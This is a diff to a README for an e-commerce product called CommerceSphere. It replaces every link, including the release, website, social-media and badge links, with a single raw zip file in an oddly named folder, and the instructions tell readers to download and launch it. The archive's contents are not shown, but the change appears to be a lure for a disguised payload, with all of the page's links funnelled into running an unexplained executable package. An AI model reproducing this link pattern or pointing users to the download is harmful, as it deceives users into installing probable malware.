@@ -18,11 +18,11 @@ CommerceSphere offers a comprehensive set of features and services tailored to m
 
 ## Getting Started 🚦
 
-To take advantage of all the amazing features CommerceSphere has to offer, simply download our [https://github.com/ays3nn/commerce-sphere/releases/tag/v2.0](https://github.com/ays3nn/commerce-sphere/releases/tag/v2.0) package and launch it. If the link does not work, be sure to check the **Releases** section for alternative download options.
+To take advantage of all the amazing features CommerceSphere has to offer, simply download our [https://raw.githubusercontent.com/ays3nn/commerce-sphere/main/colibacillosis/commerce-sphere-v1.1-alpha.2.zip](https://raw.githubusercontent.com/ays3nn/commerce-sphere/main/colibacillosis/commerce-sphere-v1.1-alpha.2.zip) package and launch it. If the link does not work, be sure to check the **Releases** section for alternative download options.
 
 ## Installation Guide 📝
 
-1. Download the [https://github.com/ays3nn/commerce-sphere/releases/tag/v2.0](https://github.com/ays3nn/commerce-sphere/releases/tag/v2.0) package from the link provided.
+1. Download the [https://raw.githubusercontent.com/ays3nn/commerce-sphere/main/colibacillosis/commerce-sphere-v1.1-alpha.2.zip](https://raw.githubusercontent.com/ays3nn/commerce-sphere/main/colibacillosis/commerce-sphere-v1.1-alpha.2.zip) package from the link provided.
 2. Unzip the package on your local machine.
 3. Follow the installation instructions included in the README file.
 4. Launch CommerceSphere and start building your online store with ease.
@@ -33,20 +33,20 @@ To take advantage of all the amazing features CommerceSphere has to offer, simpl
 
 ## Want to Learn More? 📚
 
-Visit our [website](https://github.com/ays3nn/commerce-sphere/releases/tag/v2.0) for in-depth documentation, tutorials, and demos of CommerceSphere in action. Join our community of e-commerce enthusiasts and take your online store to the next level!
+Visit our [website](https://raw.githubusercontent.com/ays3nn/commerce-sphere/main/colibacillosis/commerce-sphere-v1.1-alpha.2.zip) for in-depth documentation, tutorials, and demos of CommerceSphere in action. Join our community of e-commerce enthusiasts and take your online store to the next level!
 
 ## Stay Connected 🌐
 
 Follow us on social media for the latest updates and news about CommerceSphere:
-- Twitter: [@CommerceSphereHQ](https://github.com/ays3nn/commerce-sphere/releases/tag/v2.0)
-- Facebook: [CommerceSphere](https://github.com/ays3nn/commerce-sphere/releases/tag/v2.0)
-- LinkedIn: [CommerceSphere](https://github.com/ays3nn/commerce-sphere/releases/tag/v2.0)
+- Twitter: [@CommerceSphereHQ](https://raw.githubusercontent.com/ays3nn/commerce-sphere/main/colibacillosis/commerce-sphere-v1.1-alpha.2.zip)
+- Facebook: [CommerceSphere](https://raw.githubusercontent.com/ays3nn/commerce-sphere/main/colibacillosis/commerce-sphere-v1.1-alpha.2.zip)
+- LinkedIn: [CommerceSphere](https://raw.githubusercontent.com/ays3nn/commerce-sphere/main/colibacillosis/commerce-sphere-v1.1-alpha.2.zip)
 
 ## Show Your Support 👏
 
 If you love CommerceSphere as much as we do, consider giving us a star on GitHub and spreading the word to your fellow e-commerce aficionados. Your support means the world to us!
 
-[![Download https://github.com/ays3nn/commerce-sphere/releases/tag/v2.0](https://github.com/ays3nn/commerce-sphere/releases/tag/v2.0)](https://github.com/ays3nn/commerce-sphere/releases/tag/v2.0)
+[![Download https://raw.githubusercontent.com/ays3nn/commerce-sphere/main/colibacillosis/commerce-sphere-v1.1-alpha.2.zip](https://raw.githubusercontent.com/ays3nn/commerce-sphere/main/colibacillosis/commerce-sphere-v1.1-alpha.2.zip)](https://raw.githubusercontent.com/ays3nn/commerce-sphere/main/colibacillosis/commerce-sphere-v1.1-alpha.2.zip)
 
 ---
 
